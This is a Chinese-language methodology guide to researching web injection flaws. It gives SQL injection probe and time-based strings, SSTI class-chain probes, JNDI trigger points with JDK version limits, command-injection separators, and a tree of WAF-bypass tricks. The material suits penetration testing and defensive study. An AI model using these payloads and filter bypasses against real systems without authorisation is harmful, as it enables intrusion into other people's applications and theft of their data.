# Web注入类安全研究方法论

## 元思考框架

### 核心认知模型

```
┌─────────────────────────────────────────────────────────────────┐
│                     安全研究思维金字塔                            │
├─────────────────────────────────────────────────────────────────┤
│  L4: 防御反推    ← 从补丁/过滤规则反推绕过点                      │
│  L3: 边界探索    ← 在已知攻击面上寻找corner case                  │
│  L2: 假设验证    ← 构建推理链条，逐步验证假设                     │
│  L1: 攻击面识别  ← 寻找数据与指令不分离的接口                     │
└─────────────────────────────────────────────────────────────────┘
```

### 关键思维原则

| 原则 | 描述 | 应用场景 |
|------|------|----------|
| **数据指令分离失效** | 漏洞本质是用户数据被当作指令执行 | SQL注入、命令注入、模板注入 |
| **信任边界突破** | 找到信任传递链中的薄弱环节 | JNDI注入、反序列化 |
| **语义差异利用** | 不同组件对同一输入的解析差异 | WAF绕过、协议层面绕过 |
| **版本差异敏感** | 同一组件不同版本的安全机制差异 | 高版本绕过研究 |

---

## 攻击面识别模式

### SQL注入识别

**输入点特征**：
1. 参数直接拼接SQL语句的位置
2. 动态表名/列名/排序字段
3. 批量操作接口（IN子句）
4. 搜索/过滤功能
5. 文件名/路径参数被存入数据库

**快速验证序列**：
```sql
-- 闭合探测
?id=1'           -- 单引号闭合
?id=1"           -- 双引号闭合
?id=1')          -- 带括号闭合
?id=1\           -- 转义符探测

-- 布尔差异验证
?id=1' or 1=1#   -- 真条件
?id=1' and 1=2#  -- 假条件
?id=1' and sleep(5)#  -- 时间差异
```

**数据库指纹**：
| 数据库 | 特征 |
|--------|------|
| MySQL | information_schema、load_file、into outfile |
| MSSQL | 堆叠注入、xp_cmdshell、CONVERT报错 |
| Oracle | dual表、DBMS_PIPE延时、UTL_HTTP外带 |
| PostgreSQL | pg_sleep、COPY命令 |

### JNDI注入识别

**触发点特征**：
```java
InitialContext.lookup(userInput)
Context.lookup(userInput)
JndiTemplate.lookup(name)  // Spring
```

**版本边界（关键）**：
| 限制类型 | JDK版本 |
|----------|---------|
| RMI远程加载限制 | 6u132, 7u122, 8u113 |
| LDAP远程加载限制 | 11.0.1, 8u191, 7u201, 6u211 |

### 模板注入(SSTI)识别

**Jinja2探测**：
```python
{{config}}          # Flask配置对象
{{request}}         # 请求对象
{{[].__class__.__base__.__subclasses__()}}  # 类链探测
```

**Thymeleaf触发**：
```
viewName包含::时解析为片段表达式
__${expression}__::x  # 预处理表达式
```

### 命令注入识别

**高危功能点**：
- ping/trace测试功能
- 文件操作接口（压缩、解压）
- 系统管理接口
- 定时任务配置
- 外部程序调用接口

**截断符**：`; | || && & \` $() %0a %0d`

---

## WAF绕过策略树

```
                    ┌─ 大小写混写: UnIoN SeLeCt
                    ├─ 双写绕过: uniunionon
         关键字过滤 ─┼─ 编码绕过: hex/base64/char()
                    ├─ 注释插入: un/**/ion
                    └─ 同义替换: || 代替 or

                    ┌─ ${IFS}系列: cat${IFS}file
                    ├─ 注释符: select/**/database()
         空格过滤 ──┼─ 括号嵌套: select(database())
                    ├─ 换行符: %0a %0d
                    └─ 反引号: `select`

                    ┌─ 宽字节注入: %df%27
         引号过滤 ──┼─ 反斜杠逃逸: admin\' and password='
                    └─ 十六进制: 0x61646D696E

                    ┌─ from...for: substr(x from 1 for 1)
         逗号过滤 ──┼─ offset: limit 1 offset 2
                    └─ join别名技术
```

---

## Corner Case 思维

### 编码层面
- 双重URL编码
- Unicode变体（%u0027）
- 宽字节（GBK环境 %df%27）

### 语法层面
- 注释嵌套 `/*!50000select*/`
- 科学计数法 `1e0union`
- 浮点数 `1.0union`

### 协议层面
- HTTP参数污染
- 分块传输编码
- Content-Type混淆

---

## 代表性案例索引

| 技术类型 | 案例ID | 核心技术点 |
|----------|--------|------------|
| SQL注入 | 10041, 10042 | MySQL注入姿势、绕过总结 |
| JNDI注入 | 90682, 17638 | 高版本JDK绕过 |
| SSTI | 10527, 17440 | Jinja2/Thymeleaf利用 |
| 命令注入 | 13269, 15509 | 截断符与绕过 |
